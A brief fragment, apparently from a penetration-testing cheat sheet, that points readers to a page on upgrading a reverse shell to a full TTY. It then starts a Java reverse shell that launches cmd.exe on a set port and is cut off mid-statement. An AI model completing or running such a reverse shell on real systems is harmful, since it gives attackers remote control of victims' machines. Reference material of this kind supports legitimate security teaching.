...
**Once you get a reverse shell**[ **read this page to obtain a full TTY**](broken-reference)**.**
...
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Sock
```
